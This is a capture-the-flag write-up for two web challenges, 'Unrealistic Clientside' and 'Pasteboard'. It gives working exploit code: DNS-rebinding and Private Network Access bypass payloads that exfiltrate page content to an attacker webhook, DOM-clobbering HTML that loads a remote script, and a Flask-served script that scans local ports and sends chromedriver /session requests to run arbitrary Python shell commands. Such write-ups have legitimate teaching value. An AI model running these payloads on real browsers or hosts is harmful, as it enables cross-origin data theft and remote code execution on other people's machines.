## Unrealistic Clientside Challenge

#### Overview
Flag 1 was present in an HTTP cookie on port 5000 and Flag 2 was present in on port 5001 /motd route. Port 5001 injected cookie contents directly into page unsanitized, but for that, we need a method to set the cookie, i.e. XSS on any port on 127.0.0.1. On port 5000, our mail content was being injected in innerHTML *after* going through latest version of DOMPurify.

#### Solution
One interesting thing I noticed was that neither of these endpoints required me to have admin account. /motd didnt even need me to be logged in. And although the URL passed to bot was being validated by `url.startswith("http://127.0.0.1:5000")`, we could easily send the bot to any domain by using @example.com at the end. 

Here comes DNS rebinding into play. The idea is to have a domain, lets say example.com. We tell the browser that example.com is x.x.x.x (my malicious server). Browser happily loads it. Next, we somehow manage to force the browser to resolve to 127.0.0.1 on any subsequent requests to example.com. With this, we can bypass same origin, and should be able to send requests to local server with our controlled origin.

The problem is that DNS is cached, and TTL is ignored. Even if you send DNS with 1s TTL, it will still be cached for X amount of time. So to rebind to localhost, we use the multiple A records trick. We set A records for example.com to resolve to x.x.x.x and 127.0.0.1. Based on my testing, the browser randomly chooses between either of these. But if x.x.x.x returns TCP RST, browser will fallback to another A record IP. This is easy, just make the server kill itself after serving base html payload.

Now there is another security measure in place. Browser will block any private local IP access from a public URL. This is under [Private Network Access (PNA)](https://wicg.github.io/private-network-access/) spec. Fetch requests are blocked even before sending. And since Chromium v142, it seems to have been implemented in iframes as well. But, for some reason, the request goes through, if we just do window.open() to open it in a new tab. 

For flag 1, we can use the following script:


```py
@app.route('/')
def index():    
    response = make_response(payload)
    response.set_cookie('session', '<any cookie>')
    threading.Timer(0.2, lambda: __import__('os')._exit(0)).start()
    return response
```
HTML payload - 
```html
<script>
setInterval(()=>{
window.open("http://test.0bscuri7y.xyz:5000/flag", "_blank")
fetch("http://test.0bscuri7y.xyz:5005", {credentials: 'include'})
},1000)
</script>
```

What happens is, first, we set create an account on actual server and get a cookie. Now when bot visits our malicious domain, session cookie will be set. New window opens, and this time, the domain resolves to 127.0.0.1:5000/flag since our malicious server is offline. But the host is still same, so the cookie we set is sent. /flag sees its a valid cookie, and sets a new cookie on `test.0bscuri7y.xyz`. Now JS can't read the cookie, so we call a fetch on `test.0bscuri7y.xyz:5005` with creds. Browser sees the domain as test.0bscuri7y.xyz, and attaches its cookies, which now contain flag. Note that when we used port 5005, browser will first try 127.0.0.1, but since its not present, it will again fallback to main IP.


#### Flag 2
Flag 2 was also same. Since we can bypass PNA by using window.open(), we can just open the /motd page in a new tab, and read the html content from current tab. Since origin is exactly the same, browser has no issues with it.

```html
<script>
console.log("Loading...");
let myWindow = null;
setTimeout(function() {
myWindow = window.open("http://test.0bscuri7y.xyz:5001/motd", "_blank");
const debugTimer = setInterval(() => {
    try {
        const href = myWindow.location.href;
        const state = myWindow.document.readyState;
        const body = myWindow.document.body ? myWindow.document.body.innerHTML : "NO BODY";
        if (href !== "about:blank" && state === "complete" && body.length > 0) {
            window.open("//<your_webhook>?a="+btoa(body),"_blank" );
            clearInterval(debugTimer);
        }
    } catch (e) {
        console.log("Waiting for access/load...");
    }
}, 200);

}, 1000);
</script>
```
We serve this on `http://test.0bscuri7y.xyz:5001`, and open /motd in new tab, wait for it to fallback and resolve to 127.0.0.1:5001/motd, then just read and exfil its contents. 



## Pasteboard
Pasteboard was a straightforward challenge. We were given a note taking app, which used DOMPurify. But was vulnerable to DOM Clobbering to effect existing JS, forcing it to load our own JS script. CSP was strict-dynamic, so additional scripts loaded by nonced JS scripts dont need a nonce.

In app.js, we can see that handleError function is triggered if try block fails. In try block, we have - 
```js
const cfg = window.renderConfig || { mode: (card && card.dataset.mode) || "safe" };
const mode = cfg.mode.toLowerCase();
```
We can redefine window.renderConfig by injecting this HTML -
```html
<a id="renderConfig"></a>
```
Now, window.renderConfig will point to this element, cfg.mode will fail and trigger handleError.

Next we have this logic - 
```js
const c = window.errorReporter || { path: "/telemetry/error-reporter.js" };
const p = c.path && c.path.value
  ? c.path.value
  : String(c.path || "/telemetry/error-reporter.js");
const s = document.createElement("script");
s.id = "errorReporterScript";
let src = p;
```
If we define errorReporter which has c.path nested in it, we can set value attribute of c.path element, and the js will use that to load script, so final payload becomes - 
```html
<a id="renderConfig"></a>
<form id="errorReporter">
  <input name="path" value="http://example.com/p.js">
</form>
```

Now, we have XSS on 127.0.0.1:5000, but the flag is only present in bot.py, not used anyhwere. We need LFI. Browser version was latest, so ignorable. Another interesting thing was we were given 30 seconds and selenium was being used. Selenium uses chromedriver, which starts its on HTTP server to receive requests. Whats interesting is that it has a /session endpoint, which is intended to spawn browser sessions. But, it allows us to specify binary and args. So we can just tell it to spawn python with given args, and it will execute it. We use the payload given in [this issue](https://issuetracker.google.com/issues/40052697).

```js
fetch(`http://127.0.0.1:${port}/session`, {
    method: "POST",
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({
        "capabilities": {
            "alwaysMatch": {
                "goog:chromeOptions": {
                    "binary": "/usr/local/bin/python3",
                    "args": ["-cimport os;os.system('cat /app/bot.py > /app/static/flag.txt')"]
                }
            }
        }
    })
});
```

Since only port differs, CORS doesn't run preflight checks. Request is directly sent to chromedriver. Only the response is blocked, which we dont care about.  The problem is finding correct port. We can just start blasting from port 32000 and up, and since instance is a bit slow, we need to run it multiple times to find correct port in 30 seconds.

```py
from flask import Flask, request, render_template_string
import logging
import json
app = Flask(__name__)
from flask_cors import CORS
CORS(app)

logging.basicConfig(level=logging.INFO)

payload = r"""
async function blindExploitFlood() {
    const startPort = 32000;
    const endPort = 65535;
    const webhook = 'http://<ip>:5775/callback';
    const batchSize = 100;     
    const chunkSize = 1000;   
    const openPorts = [];
    
    let batchesCompleted = 0;
    let isAborted = false;

    const globalTimeoutController = new AbortController();
    const killTimer = setTimeout(() => {
        isAborted = true;
        globalTimeoutController.abort();
        console.log("20s reached: Finalizing results.");
    }, 20000);

    const firePayload = async (port) => {
        try {
            await fetch(`http://127.0.0.1:${port}/session`, {
                method: "POST",
                mode: 'no-cors',
                signal: globalTimeoutController.signal,
                headers: { 'Content-Type': 'text/plain' },
                body: JSON.stringify({
                    "capabilities": {
                        "alwaysMatch": {
                            "goog:chromeOptions": {
                                "binary": "/usr/local/bin/python3",
                                "args": ["-cimport os;os.system('cat /app/bot.py > /app/static/flag.txt')"]
                            }
                        }
                    }
                })
            });
            openPorts.push(port);
        } catch (err) {
            
        }
    };

    
    for (let chunkStart = startPort; chunkStart <= endPort; chunkStart += chunkSize) {
        if (isAborted) break;

        const chunkEnd = Math.min(chunkStart + chunkSize - 1, endPort);
        
        for (let i = chunkStart; i <= chunkEnd; i += batchSize) {
            if (isAborted) break;
            const batch = [];
            for (let j = 0; j < batchSize && (i + j) <= chunkEnd; j++) {
                batch.push(firePayload(i + j));
            }
            await Promise.allSettled(batch);
        }

        batchesCompleted++;

        await fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                status: "progress",
                last_port_reached: chunkEnd,
                batches_completed: batchesCompleted,
                found_so_far: openPorts
            })
        });
    }

    clearTimeout(killTimer);

    await fetch(webhook, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            status: "finished",
            total_batches: batchesCompleted,
            detected_open_ports: openPorts
        })
    });
}

blindExploitFlood();
"""

@app.before_request
def log_request_info():
    if request.get_data():
        app.logger.info(f'Body: {request.get_data(as_text=True)}')
        app.logger.info(f'Headers: {request.headers}')

@app.route('/x.js', methods=['GET'])
def session():
    return payload, 200, {'Content-Type': 'application/javascript'}

@app.route('/callback', methods=['POST'])
def callback():
    return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5775)
```
I just made the blasting process chunked, so that i could also exfil progress stats for debugging without choking the connection pool. Core idea remains same, broadcast payload to all ports. The bot.py will be copied to static folder, which we can directly read through /static endpoint.